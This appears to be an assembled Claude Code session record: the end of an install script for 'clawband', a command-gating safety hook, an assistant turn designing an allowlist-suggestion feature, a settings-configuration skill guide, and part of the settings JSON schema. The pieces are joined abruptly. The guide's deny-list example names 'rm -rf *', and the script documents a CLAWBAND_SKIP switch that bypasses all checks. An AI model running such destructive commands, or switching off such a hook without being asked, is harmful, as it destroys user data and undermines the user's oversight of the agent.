52	if [ ! -f "$CONFIG_DIR/allow.patterns" ]; then
53	  cat > "$CONFIG_DIR/allow.patterns" << 'EOF'
54	# allow.patterns — patterns that override deny/ask blocks
55	# One pattern per line. Case-insensitive regex. Lines starting with # ignored.
56	#
57	# Example: allow git reset --hard only to HEAD
58	# git reset --hard HEAD$
59	EOF
60	  green "Created: $CONFIG_DIR/allow.patterns"
61	fi
62	
63	# ── Wire up settings.json ─────────────────────────────────────────────────────
64	HOOK_ENTRY='{"matcher":"Bash","hooks":[{"type":"command","command":"~/.claude/hooks/clawband"}]}'
65	
66	if [ ! -f "$SETTINGS" ]; then
67	  echo '{"hooks":{"PreToolUse":[]}}' > "$SETTINGS"
68	fi
69	
70	if grep -q '"clawband"' "$SETTINGS" 2>/dev/null; then
71	  yellow "Already registered in $SETTINGS — skipping"
72	else
73	  UPDATED=$(jq --argjson entry "$HOOK_ENTRY" '
74	    .hooks.PreToolUse = ([$entry] + (.hooks.PreToolUse // []))
75	  ' "$SETTINGS")
76	  echo "$UPDATED" > "$SETTINGS"
77	  green "Registered hook in $SETTINGS"
78	fi
79	
80	echo ""
81	green "Done. Run /hooks in Claude Code (or restart) to activate clawband."
82	echo ""
83	echo "  Config:  $CONFIG_DIR/{deny,ask,allow}.patterns"
84	echo "  Options: RTK_ENABLED=1   strip rtk prefix before matching"
85	echo "           CLAWBAND_LOG=1  append blocks/prompts to ~/.clawband.log"
86	echo "           CLAWBAND_SKIP=1 bypass all checks (trusted scripts)"

The image is upside-down and hard to read clearly, but I can make out a clawband prompt triggering on what looks like a `terraform` compound command. 

The old bash version had a known bug: `grep -qiE` treats `|` as a regex OR operator, which causes pipe-to-interpreter patterns to match almost everything — producing false positives. The Rust version uses the `regex` crate and eliminates that whole class of bug.

So yes, if that's what's happening, our version fixes it.

A couple of things to check though:

1. **Which hook is active on the work laptop?** The install created both `clawband.sh` (old bash) and `clawband` (Rust binary). If the settings.json still points to `clawband.sh`, it'd still hit the bug. Running `clawband stats` or `clawband --version` would confirm which is active.

2. **Can you share the exact command that triggered it?** The image is low-res and upside-down — if I can see the actual command I can tell you definitively whether our version would catch it, pass it, or it's a different class of issue entirely.

_**Agent (claude-sonnet-4-6 2026-06-03 10:04:21Z)**_

Good. Let me plan this out before coding — the design is the tricky part.

**How it works:**
1. When clawband outputs "ask", it writes a breadcrumb: `~/.clawband/.last-ask` (timestamp + reason)
2. If user approves → bash runs → PostToolUse fires → `clawband post` reads the breadcrumb, outputs a suggestion to Claude's context, deletes the breadcrumb
3. If user denies → bash doesn't run → PostToolUse doesn't fire → breadcrumb expires (60s TTL check on next read)

**Optional install:** `bash install.sh --post-hook` registers the PostToolUse hook. Default install unchanged.

**`clawband post` output** (injected into Claude's context as a system reminder):
> "User approved a prompted command. Suggest they run: `clawband allow 'git reset --hard'`"

Starting implementation now:

# Update Config Skill

Modify Claude Code configuration by updating settings.json files.

## When Hooks Are Required (Not Memory)

If the user wants something to happen automatically in response to an EVENT, they need a **hook** configured in settings.json. Memory/preferences cannot trigger automated actions.

**These require hooks:**
- "Before compacting, ask me what to preserve" → PreCompact hook
- "After writing files, run prettier" → PostToolUse hook with Write|Edit matcher
- "When I run bash commands, log them" → PreToolUse hook with Bash matcher
- "Always run tests after code changes" → PostToolUse hook

**Hook events:** PreToolUse, PostToolUse, PreCompact, PostCompact, Stop, Notification, SessionStart

## CRITICAL: Read Before Write

**Always read the existing settings file before making changes.** Merge new settings with existing ones - never replace the entire file.

## CRITICAL: Use AskUserQuestion for Ambiguity

When the user's request is ambiguous, use AskUserQuestion to clarify:
- Which settings file to modify (user/project/local)
- Whether to add to existing arrays or replace them
- Specific values when multiple options exist

## Decision: /config command vs Direct Edit

**Suggest the `/config` slash command** for these simple settings:
- `theme`, `editorMode`, `verbose`, `model`
- `language`, `alwaysThinkingEnabled`
- `permissions.defaultMode`

**Edit settings.json directly** for:
- Hooks (PreToolUse, PostToolUse, etc.)
- Complex permission rules (allow/deny arrays)
- Environment variables
- MCP server configuration
- Plugin configuration

## Workflow

1. **Clarify intent** - Ask if the request is ambiguous
2. **Read existing file** - Use Read tool on the target settings file
3. **Merge carefully** - Preserve existing settings, especially arrays
4. **Edit file** - Use Edit tool (if file doesn't exist, ask user to create it first)
5. **Confirm** - Tell user what was changed

## Merging Arrays (Important!)

When adding to permission arrays or hook arrays, **merge with existing**, don't replace:

**WRONG** (replaces existing permissions):
```json
{ "permissions": { "allow": ["Bash(npm *)"] } }
```

**RIGHT** (preserves existing + adds new):
```json
{
  "permissions": {
    "allow": [
      "Bash(git *)",      // existing
      "Edit(.claude)",    // existing
      "Bash(npm *)"       // new
    ]
  }
}
```

## Settings File Locations

Choose the appropriate file based on scope:

| File | Scope | Git | Use For |
|------|-------|-----|---------|
| `~/.claude/settings.json` | Global | N/A | Personal preferences for all projects |
| `.claude/settings.json` | Project | Commit | Team-wide hooks, permissions, plugins |
| `.claude/settings.local.json` | Project | Gitignore | Personal overrides for this project |

Settings load in order: user → project → local (later overrides earlier).

## Settings Schema Reference

### Permissions
```json
{
  "permissions": {
    "allow": ["Bash(npm *)", "Edit(.claude)", "Read"],
    "deny": ["Bash(rm -rf *)"],
    "ask": ["Write(/etc/*)"],
    "defaultMode": "default" | "plan" | "acceptEdits" | "dontAsk",
    "additionalDirectories": ["/extra/dir"]
  }
}
```

**Permission Rule Syntax:**
- Exact match: `"Bash(npm run test)"`
- Prefix wildcard: `"Bash(git *)"` - matches `git`, `git status`, `git commit`, etc.
- Tool only: `"Read"` - allows all Read operations

### Environment Variables
```json
{
  "env": {
    "DEBUG": "true",
    "MY_API_KEY": "value"
  }
}
```

### Model & Agent
```json
{
  "model": "sonnet",  // or "opus", "haiku", full model ID
  "agent": "agent-name",
  "alwaysThinkingEnabled": true
}
```

### Attribution (Commits & PRs)
```json
{
  "attribution": {
    "commit": "Custom commit trailer text",
    "pr": "Custom PR description text"
  }
}
```
Set `commit` or `pr` to empty string `""` to hide that attribution.

### MCP Server Management
```json
{
  "enableAllProjectMcpServers": true,
  "enabledMcpjsonServers": ["server1", "server2"],
  "disabledMcpjsonServers": ["blocked-server"]
}
```

### Plugins
```json
{
  "enabledPlugins": {
    "formatter@anthropic-tools": true
  }
}
```
Plugin syntax: `plugin-name@source` where source is `claude-code-marketplace`, `claude-plugins-official`, or `builtin`.

### Other Settings
- `language`: Preferred response language (e.g., "japanese")
- `cleanupPeriodDays`: Days to keep transcripts before automatic cleanup (default: 30; minimum 1)
- `respectGitignore`: Whether to respect .gitignore (default: true)
- `spinnerTipsEnabled`: Show tips in spinner
- `spinnerVerbs`: Customize spinner verbs (`{ "mode": "append" | "replace", "verbs": [...] }`)
- `spinnerTipsOverride`: Override spinner tips (`{ "excludeDefault": true, "tips": ["Custom tip"] }`)
- `syntaxHighlightingDisabled`: Disable diff highlighting


## Hooks Configuration

Hooks run commands at specific points in Claude Code's lifecycle.

### Hook Structure
```json
{
  "hooks": {
    "EVENT_NAME": [
      {
        "matcher": "ToolName|OtherTool",
        "hooks": [
          {
            "type": "command",
            "command": "your-command-here",
            "timeout": 60,
            "statusMessage": "Running..."
          }
        ]
      }
    ]
  }
}
```

### Hook Events

| Event | Matcher | Purpose |
|-------|---------|---------|
| PermissionRequest | Tool name | Run before permission prompt |
| PreToolUse | Tool name | Run before tool, can block |
| PostToolUse | Tool name | Run after successful tool |
| PostToolUseFailure | Tool name | Run after tool fails |
| Notification | Notification type | Run on notifications |
| Stop | - | Run when Claude stops (including clear, resume, compact) |
| PreCompact | "manual"/"auto" | Before compaction |
| PostCompact | "manual"/"auto" | After compaction (receives summary) |
| UserPromptSubmit | - | When user submits |
| SessionStart | - | When session starts |

**Common tool matchers:** `Bash`, `Write`, `Edit`, `Read`, `Glob`, `Grep`

### Hook Types

**1. Command Hook** - Runs a shell command:
```json
{ "type": "command", "command": "prettier --write $FILE", "timeout": 30 }
```

**2. Prompt Hook** - Evaluates a condition with LLM:
```json
{ "type": "prompt", "prompt": "Is this safe? $ARGUMENTS" }
```
Only available for tool events: PreToolUse, PostToolUse, PermissionRequest.

**3. Agent Hook** - Runs an agent with tools:
```json
{ "type": "agent", "prompt": "Verify tests pass: $ARGUMENTS" }
```
Only available for tool events: PreToolUse, PostToolUse, PermissionRequest.

### Hook Input (stdin JSON)
```json
{
  "session_id": "abc123",
  "tool_name": "Write",
  "tool_input": { "file_path": "/path/to/file.txt", "content": "..." },
  "tool_response": { "success": true }  // PostToolUse only
}
```

### Hook JSON Output

Hooks can return JSON to control behavior:

```json
{
  "systemMessage": "Warning shown to user in UI",
  "continue": false,
  "stopReason": "Message shown when blocking",
  "suppressOutput": false,
  "decision": "block",
  "reason": "Explanation for decision",
  "hookSpecificOutput": {
    "hookEventName": "PostToolUse",
    "additionalContext": "Context injected back to model"
  }
}
```

**Fields:**
- `systemMessage` - Display a message to the user (all hooks)
- `continue` - Set to `false` to block/stop (default: true)
- `stopReason` - Message shown when `continue` is false
- `suppressOutput` - Hide stdout from transcript (default: false)
- `decision` - "block" for PostToolUse/Stop/UserPromptSubmit hooks (deprecated for PreToolUse, use hookSpecificOutput.permissionDecision instead)
- `reason` - Explanation for decision
- `hookSpecificOutput` - Event-specific output (must include `hookEventName`):
  - `additionalContext` - Text injected into model context
  - `permissionDecision` - "allow", "deny", or "ask" (PreToolUse only)
  - `permissionDecisionReason` - Reason for the permission decision (PreToolUse only)
  - `updatedInput` - Modified tool input (PreToolUse only)

### Common Patterns

**Auto-format after writes:**
```json
{
  "hooks": {
    "PostToolUse": [{
      "matcher": "Write|Edit",
      "hooks": [{
        "type": "command",
        "command": "jq -r '.tool_response.filePath // .tool_input.file_path' | { read -r f; prettier --write \"$f\"; } 2>/dev/null || true"
      }]
    }]
  }
}
```

**Log all bash commands:**
```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "jq -r '.tool_input.command' >> ~/.claude/bash-log.txt"
      }]
    }]
  }
}
```

**Stop hook that displays message to user:**

Command must output JSON with `systemMessage` field:
```bash
# Example command that outputs: {"systemMessage": "Session complete!"}
echo '{"systemMessage": "Session complete!"}'
```

**Run tests after code changes:**
```json
{
  "hooks": {
    "PostToolUse": [{
      "matcher": "Write|Edit",
      "hooks": [{
        "type": "command",
        "command": "jq -r '.tool_input.file_path // .tool_response.filePath' | grep -E '\\.(ts|js)$' && npm test || true"
      }]
    }]
  }
}
```


## Constructing a Hook (with verification)

Given an event, matcher, target file, and desired behavior, follow this flow. Each step catches a different failure class — a hook that silently does nothing is worse than no hook.

1. **Dedup check.** Read the target file. If a hook already exists on the same event+matcher, show the existing command and ask: keep it, replace it, or add alongside.

2. **Construct the command for THIS project — don't assume.** The hook receives JSON on stdin. Build a command that:
   - Extracts any needed payload safely — use `jq -r` into a quoted variable or `{ read -r f; ... "$f"; }`, NOT unquoted `| xargs` (splits on spaces)
   - Invokes the underlying tool the way this project runs it (npx/bunx/yarn/pnpm? Makefile target? globally-installed?)
   - Skips inputs the tool doesn't handle (formatters often have `--ignore-unknown`; if not, guard by extension)
   - Stays RAW for now — no `|| true`, no stderr suppression. You'll wrap it after the pipe-test passes.

3. **Pipe-test the raw command.** Synthesize the stdin payload the hook will receive and pipe it directly:
   - `Pre|PostToolUse` on `Write|Edit`: `echo '{"tool_name":"Edit","tool_input":{"file_path":"<a real file from this repo>"}}' | <cmd>`
   - `Pre|PostToolUse` on `Bash`: `echo '{"tool_name":"Bash","tool_input":{"command":"ls"}}' | <cmd>`
   - `Stop`/`UserPromptSubmit`/`SessionStart`: most commands don't read stdin, so `echo '{}' | <cmd>` suffices

   Check exit code AND side effect (file actually formatted, test actually ran). If it fails you get a real error — fix (wrong package manager? tool not installed? jq path wrong?) and retest. Once it works, wrap with `2>/dev/null || true` (unless the user wants a blocking check).

4. **Write the JSON.** Merge into the target file (schema shape in the "Hook Structure" section above). If this creates `.claude/settings.local.json` for the first time, add it to .gitignore — the Write tool doesn't auto-gitignore it.

5. **Validate syntax + schema in one shot:**

   `jq -e '.hooks.<event>[] | select(.matcher == "<matcher>") | .hooks[] | select(.type == "command") | .command' <target-file>`

   Exit 0 + prints your command = correct. Exit 4 = matcher doesn't match. Exit 5 = malformed JSON or wrong nesting. A broken settings.json silently disables ALL settings from that file — fix any pre-existing malformation too.

6. **Prove the hook fires** — only for `Pre|PostToolUse` on a matcher you can trigger in-turn (`Write|Edit` via Edit, `Bash` via Bash). `Stop`/`UserPromptSubmit`/`SessionStart` fire outside this turn — skip to step 7.

   For a **formatter** on `PostToolUse`/`Write|Edit`: introduce a detectable violation via Edit (two consecutive blank lines, bad indentation, missing semicolon — something this formatter corrects; NOT trailing whitespace, Edit strips that before writing), re-read, confirm the hook **fixed** it. For **anything else**: temporarily prefix the command in settings.json with `echo "$(date) hook fired" >> /tmp/claude-hook-check.txt; `, trigger the matching tool (Edit for `Write|Edit`, a harmless `true` for `Bash`), read the sentinel file.

   **Always clean up** — revert the violation, strip the sentinel prefix — whether the proof passed or failed.

   **If proof fails but pipe-test passed and `jq -e` passed**: the settings watcher isn't watching `.claude/` — it only watches directories that had a settings file when this session started. The hook is written correctly. Tell the user to open `/hooks` once (reloads config) or restart — you can't do this yourself; `/hooks` is a user UI menu and opening it ends this turn.

7. **Handoff.** Tell the user the hook is live (or needs `/hooks`/restart per the watcher caveat). Point them at `/hooks` to review, edit, or disable it later. The UI only shows "Ran N hooks" if a hook errors or is slow — silent success is invisible by design.


## Example Workflows

### Adding a Hook

User: "Format my code after Claude writes it"

1. **Clarify**: Which formatter? (prettier, gofmt, etc.)
2. **Read**: `.claude/settings.json` (or create if missing)
3. **Merge**: Add to existing hooks, don't replace
4. **Result**:
```json
{
  "hooks": {
    "PostToolUse": [{
      "matcher": "Write|Edit",
      "hooks": [{
        "type": "command",
        "command": "jq -r '.tool_response.filePath // .tool_input.file_path' | { read -r f; prettier --write \"$f\"; } 2>/dev/null || true"
      }]
    }]
  }
}
```

### Adding Permissions

User: "Allow npm commands without prompting"

1. **Read**: Existing permissions
2. **Merge**: Add `Bash(npm *)` to allow array
3. **Result**: Combined with existing allows

### Environment Variables

User: "Set DEBUG=true"

1. **Decide**: User settings (global) or project settings?
2. **Read**: Target file
3. **Merge**: Add to env object
```json
{ "env": { "DEBUG": "true" } }
```

## Common Mistakes to Avoid

1. **Replacing instead of merging** - Always preserve existing settings
2. **Wrong file** - Ask user if scope is unclear
3. **Invalid JSON** - Validate syntax after changes
4. **Forgetting to read first** - Always read before write

## Troubleshooting Hooks

If a hook isn't running:
1. **Check the settings file** - Read ~/.claude/settings.json or .claude/settings.json
2. **Verify JSON syntax** - Invalid JSON silently fails
3. **Check the matcher** - Does it match the tool name? (e.g., "Bash", "Write", "Edit")
4. **Check hook type** - Is it "command", "prompt", or "agent"?
5. **Test the command** - Run the hook command manually to see if it works
6. **Use --debug** - Run `claude --debug` to see hook execution logs

      "type": "object",

    "defaultShell": {
      "description": "Default shell for input-box ! commands. Defaults to 'bash' on all platforms (no Windows auto-flip).",
      "type": "string",
      "enum": [
        "bash",
        "powershell"
      ]
    },
    "allowManagedHooksOnly": {
      "description": "When true (and set in managed settings), only hooks from managed settings run. User, project, and local hooks are ignored.",
      "type": "boolean"
    },
    "allowedHttpHookUrls": {
      "description": "Allowlist of URL patterns that HTTP hooks may target. Supports * as a wildcard (e.g. \"https://hooks.example.com/*\"). When set, HTTP hooks with non-matching URLs are blocked. If undefined, all URLs are allowed. If empty array, no HTTP hooks are allowed. Arrays merge across settings sources (same semantics as allowedMcpServers).",
      "type": "array",
      "items": {
        "type": "string"
      }
    },
    "httpHookAllowedEnvVars": {
      "description": "Allowlist of environment variable names HTTP hooks may interpolate into headers. When set, each hook's effective allowedEnvVars is the intersection with this list. If undefined, no restriction is applied. Arrays merge across settings sources (same semantics as allowedMcpServers).",
      "type": "array",
      "items": {
        "type": "string"
      }
    },
    "allowManagedPermissionRulesOnly": {
      "description": "When true (and set in managed settings), only permission rules (allow/deny/ask) from managed settings are respected. User, project, local, and CLI argument permission rules are ignored.",
      "type": "boolean"
    },
    "allowManagedMcpServersOnly": {
      "description": "When true (and set in managed settings), allowedMcpServers is only read from managed settings. deniedMcpServers still merges from all sources, so users can deny servers for themselves. Users can still add their own MCP servers, but only the admin-defined allowlist applies.",
      "type": "boolean"
    },
    "allowAllClaudeAiMcps": {
      "description": "When true (and set in managed settings), claude.ai cloud MCP connectors load alongside managed-mcp.json instead of being suppressed by its exclusive-control lockdown. Default off preserves the lockdown. Read from managed settings only.",
      "type": "boolean"
    },
    "strictPluginOnlyCustomization": {
      "description": "When set in managed settings, blocks non-plugin customization sources for the listed surfaces. Array form locks specific surfaces (e.g. [\"skills\", \"hooks\"]); `true` locks all four; `false` is an explicit no-op. Blocked: ~/.claude/{surface}/, .claude/{surface}/ (project), settings.json hooks, .mcp.json. NOT blocked: managed (policySettings) sources, plugin-provided customizations. Composes with strictKnownMarketplaces for end-to-end admin control — plugins gated by marketplace allowlist, everything else blocked here.",
      "anyOf": [
        {
          "type": "boolean"
        },
        {
          "type": "array",
          "items": {
            "type": "string",
            "enum": [
              "skills",
              "agents",
              "hooks",
              "mcp"
            ]
          }
        }
      ]
    },
    "statusLine": {
      "description": "Custom status line display configuration",
      "type": "object",
      "properties": {
        "type": {
          "type": "string",
          "const": "command"
        },
        "command": {
          "type": "string"
        },
        "padding": {
          "type": "number"
        },
        "refreshInterval": {
          "description": "Re-run the status line command every N seconds in addition to event-driven updates",
          "type": "number",
          "minimum": 1
        },
        "hideVimModeIndicator": {
          "description": "Hide the built-in `-- INSERT --` / `-- VISUAL --` indicator below the prompt. Use this when your status line script renders `vim.mode` itself.",
          "type": "boolean"
        }
      },
      "required": [
        "type",
        "command"
      ]
    },
    "prUrlTemplate": {
      "description": "URL template for PR links in the footer badge and inline messages. Placeholders: {host} {owner} {repo} {number} {url}. Example: \"https://reviews.example.com/{owner}/{repo}/pull/{number}\"",
      "type": "string"
    },
    "subagentStatusLine": {
      "description": "Custom per-subagent status line shown in the agent panel; receives row context as JSON on stdin",
      "type": "object",
      "properties": {
        "type": {
          "type": "string",
          "const": "command"
        },
        "command": {
          "type": "string"
        }
      },
      "required": [
        "type",
        "command"
      ]
    },
    "enabledPlugins": {
      "description": "Enabled plugins using plugin-id@marketplace-id format. Example: { \"formatter@anthropic-tools\": true }. Also supports extended format with version constraints. Settings precedence is user < project < local < flag < policy, so to disable a plugin that project settings enable, set it to false in .claude/settings.local.json — setting false in ~/.claude/settings.json is overridden by the project.",
      "type": "object",
      "propertyNames": {
        "type": "string"
      },
      "additionalProperties": {
        "anyOf": [
          {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          {
            "type": "boolean"
          },
          {
            "not": {}
          }
        ]
      }
    },
    "extraKnownMarketplaces": {
      "description": "Additional marketplaces to make available for this repository. Typically used in repository .claude/settings.json to ensure team members have required plugin sources.",
      "type": "object",
      "propertyNames": {
        "type": "string"
      },
      "additionalProperties": {
        "type": "object",
        "properties": {
          "source": {
            "description": "Where to fetch the marketplace from",
            "anyOf": [
              {
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "url"
                  },
                  "url": {
                    "description": "Direct URL to marketplace.json file",
                    "type": "string",
                    "format": "uri"
                  },
                  "headers": {
                    "description": "Custom HTTP headers (e.g., for authentication)",
                    "type": "object",
                    "propertyNames": {
                      "type": "string"
                    },
                    "additionalProperties": {
                      "type": "string"
                    }
                  }
                },
                "required": [
                  "source",
                  "url"
                ]
              },
              {
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "github"
                  },
                  "repo": {
                    "description": "GitHub repository in owner/repo format",
                    "type": "string"
                  },
                  "ref": {
                    "description": "Git branch or tag to use (e.g., \"main\", \"v1.0.0\"). Defaults to repository default branch.",
                    "type": "string"
                  },
                  "path": {
                    "description": "Path to marketplace.json within repo (defaults to .claude-plugin/marketplace.json)",
                    "type": "string"
                  },
                  "sparsePaths": {
                    "description": "Directories to include via git sparse-checkout (cone mode). Use for monorepos where the marketplace lives in a subdirectory. Example: [\".claude-plugin\", \"plugins\"]. If omitted, the full repository is cloned.",
                    "type": "array",
                    "items": {
                      "type": "string"
                    }
                  },
                  "skipLfs": {
                    "description": "Skip Git LFS smudge during clone and update (sets GIT_LFS_SKIP_SMUDGE=1) so LFS pointer files stay as pointers instead of downloading their content. Use for marketplaces hosted in repos with large LFS objects.",
                    "type": "boolean"
                  }
                },
                "required": [
                  "source",
                  "repo"
                ]
              },
              {
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "git"
                  },
                  "url": {
                    "description": "Full git repository URL",
                    "type": "string"
                  },
                  "ref": {
                    "description": "Git branch or tag to use (e.g., \"main\", \"v1.0.0\"). Defaults to repository default branch.",
                    "type": "string"
                  },
                  "path": {
                    "description": "Path to marketplace.json within repo (defaults to .claude-plugin/marketplace.json)",
                    "type": "string"
                  },
                  "sparsePaths": {
                    "description": "Directories to include via git sparse-checkout (cone mode). Use for monorepos where the marketplace lives in a subdirectory. Example: [\".claude-plugin\", \"plugins\"]. If omitted, the full repository is cloned.",
                    "type": "array",
                    "items": {
                      "type": "string"
                    }
                  },
                  "skipLfs": {
                    "description": "Skip Git LFS smudge during clone and update (sets GIT_LFS_SKIP_SMUDGE=1) so LFS pointer files stay as pointers instead of downloading their content. Use for marketplaces hosted in repos with large LFS objects.",
                    "type": "boolean"
                  }
                },
                "required": [
                  "source",
                  "url"
                ]
              },
              {
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "npm"
                  },
                  "package": {
                    "description": "NPM package containing marketplace.json",
                    "type": "string"
                  }
                },
                "required": [
                  "source",
                  "package"
                ]
              },
              {
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "file"
                  },
                  "path": {
                    "description": "Local file path to marketplace.json",
                    "type": "string"
                  }
                },
                "required": [
                  "source",
                  "path"
                ]
              },
              {
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "directory"
                  },
                  "path": {
                    "description": "Local directory containing .claude-plugin/marketplace.json",
                    "type": "string"
                  }
                },
                "required": [
                  "source",
                  "path"
                ]
              },
              {
                "description": "Policy-list sentinel for the ~/.claude/skills/ auto-load (@skills-dir plugins). In strictKnownMarketplaces: opt the scan back IN (by default any allowlist blocks it). In blockedMarketplaces: turn the scan OFF without otherwise restricting marketplaces. Only meaningful in those two managed-settings lists (areLocalPluginDirsAllowedByPolicy); known_marketplaces.json / marketplace add etc. ignore it.",
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "skills-dir"
                  }
                },
                "required": [
                  "source"
                ]
              },
              {
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "hostPattern"
                  },
                  "hostPattern": {
                    "description": "Regex pattern to match the host/domain extracted from any marketplace source type. For github sources, matches against \"github.com\". For git sources (SSH or HTTPS), extracts the hostname from the URL. Use in strictKnownMarketplaces to allow all marketplaces from a specific host (e.g., \"^github\\.mycompany\\.com$\").",
                    "type": "string"
                  }
                },
                "required": [
                  "source",
                  "hostPattern"
                ]
              },
              {
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "pathPattern"
                  },
                  "pathPattern": {
                    "description": "Regex pattern matched against the .path field of file and directory sources. Use in strictKnownMarketplaces to allow filesystem-based marketplaces alongside hostPattern restrictions for network sources. Use \".*\" to allow all filesystem paths, or a narrower pattern (e.g., \"^/opt/approved/\") to restrict to specific directories.",
                    "type": "string"
                  }
                },
                "required": [
                  "source",
                  "pathPattern"
                ]
              },
              {
                "description": "Inline marketplace manifest defined directly in settings.json. The reconciler writes a synthetic marketplace.json to the cache; diffMarketplaces detects edits via isEqual on the stored source (the plugins array is inside this object, so edits surface as sourceChanged).",
                "type": "object",
                "properties": {
                  "source": {
                    "type": "string",
                    "const": "settings"
                  },
                  "name": {
                    "description": "Marketplace name. Must match the extraKnownMarketplaces key (enforced); the synthetic manifest is written under this name. Same validation as PluginMarketplaceSchema plus reserved-name rejection — validateOfficialNameSource runs after the disk write, too late to clean up.",
                    "type": "string",
                    "minLength": 1
                  },
                  "plugins": {
                    "description": "Plugin entries declared inline in settings.json",
                    "type": "array",
                    "items": {
                      "type": "object",
                      "properties": {
                        "name": {
                          "description": "Plugin name as it appears in the target repository",
                          "type": "string",
                          "minLength": 1
                        },
                        "source": {
                          "description": "Where to fetch the plugin from. Must be a remote source — relative paths have no marketplace repository to resolve against.",
                          "anyOf": [
                            {
                              "description": "Path to the plugin root, relative to the marketplace root (the directory containing .claude-plugin/, not .claude-plugin/ itself)",
                              "type": "string",
                              "pattern": "^\\.\\/.*"
                            },
                            {
                              "description": "NPM package as plugin source",
                              "type": "object",
                              "properties": {
                                "source": {
                                  "type": "string",
                                  "const": "npm"
                                },
                                "package": {
                                  "description": "Package name (or url, or local path, or anything else that can be passed to `npm` as a package)",
                                  "anyOf": [
                                    {
                                      "type": "string"
                                    },
                                    {
                                      "type": "string"
                                    }
                                  ]
                                },
                                "version": {
                                  "description": "Specific version or version range (e.g., ^1.0.0, ~2.1.0)",
                                  "type": "string"
                                },
                                "registry": {
                                  "description": "Custom NPM registry URL (defaults to using system default, likely npmjs.org)",
                                  "type": "string",
                                  "format": "uri"
                                }
                              },
                              "required": [
                                "source",
                                "package"
                              ]
                            },
                            {
                              "type": "object",
                              "properties": {
                                "source": {
                                  "type": "string",
                                  "const": "url"
                                },
                                "url": {
                                  "description": "Full git repository URL (https:// or git@)",
                                  "type": "string"
                                },
                                "ref": {
                                  "description": "Git branch or tag to use (e.g., \"main\", \"v1.0.0\"). Defaults to repository default branch.",
                                  "type": "string"
                                },
                                "sha": {
                                  "description": "Specific commit SHA to use",
                                  "type": "string",
                                  "minLength": 40,
                                  "maxLength": 40,
                                  "pattern": "^[a-f0-9]{40}$"
                                }
                              },
                              "required": [
                                "source",
                                "url"
                              ]
                            },
                            {
                              "type": "object",
                              "properties": {
                                "source": {
                                  "type": "string",
                                  "const": "github"
                                },
                                "repo": {
                                  "description": "GitHub repository in owner/repo format",
                                  "type": "string"
                                },
                                "ref": {
                                  "description": "Git branch or tag to use (e.g., \"main\", \"v1.0.0\"). Defaults to repository default branch.",
                                  "type": "string"
                                },
                                "sha": {
                                  "description": "Specific commit SHA to use",
                                  "type": "string",
                                  "minLength": 40,
                                  "maxLength": 40,
                                  "pattern": "^[a-f0-9]{40}$"
                                }
                              },
                              "required": [
                                "source",
                                "repo"
                              ]
                            },
                            {
                              "description": "Plugin located in a subdirectory of a larger repository (monorepo). Only the specified subdirectory is materialized; the rest of the repo is not downloaded.",
                              "type": "object",
                              "properties": {
                                "source": {
                                  "type": "string",
                                  "const": "git-subdir"
                                },
                                "url": {
                                  "description": "Git repository: GitHub owner/repo shorthand, https://, or git@ URL",
                                  "type": "string"
                                },
                                "path": {
                                  "description": "Subdirectory within the repo containing the plugin (e.g., \"tools/claude-plugin\"). Cloned sparsely using partial clone (--filter=tree:0) to minimize bandwidth for monorepos.",
                                  "type": "string",
                                  "minLength": 1
                                },
                                "ref": {
                                  "description": "Git branch or tag to use (e.g., \"main\", \"v1.0.0\"). Defaults to repository default branch.",
                                  "type": "string"
                                },
                                "sha": {
                                  "description": "Specific commit SHA to use",
                                  "type": "string",
                                  "minLength": 40,
                                  "maxLength": 40,
                                  "pattern": "^[a-f0-9]{40}$"
                                }
                              },
                              "required": [
                                "source",
                                "url",
                                "path"
                              ]
                            },
                            {
                              "description": "Placeholder for source types this Claude Code version does not recognize. Never authored by hand — PluginMarketplaceSchema rewrites unparseable sources to this so the entry remains in marketplace.plugins (detectDelistedPlugins must not see it as removed). Install attempts fail at cachePlugin with a clear \"update Claude Code\" message.",
                              "type": "object",
                              "properties": {
                                "source": {
                                  "type": "string",
                                  "const": "unsupported"
                                }
                              },
                              "required": [
                                "source"
                              ]
                            }
                          ]
                        },
                        "description": {
                          "type": "string"
                        },
                        "version": {
                          "type": "string"
                        },
                        "strict": {
                          "type": "boolean"
                        }
                      },
                      "required": [
                        "name",
                        "source"
                      ]
                    }
                  },
                  "owner": {
                    "type": "object",
                    "properties": {
                      "name": {
                        "description": "Display name of the plugin author or organization",
                        "type": "string",
                        "minLength": 1
                      },
                      "email": {
                        "description": "Contact email for support or feedback",
                        "type": "string"
                      },
                      "url": {
                        "description": "Website, GitHub profile, or organization URL",
                        "type": "string"
                      }
                    },
                    "required": [
                      "name"
                    ]
                  }
                },
                "required": [
                  "source",
                  "name",
                  "plugins"
                ]
              }
            ]
          },
          "installLocation": {
            "description": "Local cache path where marketplace manifest is stored (auto-generated if not provided)",
            "type": "string"
          },
          "autoUpdate": {
            "description": "Whether to automatically update this marketplace and its installed plugins on startup",
            "type": "boolean"
          }
        },
        "required": [
          "source"
        ]
      }
    },
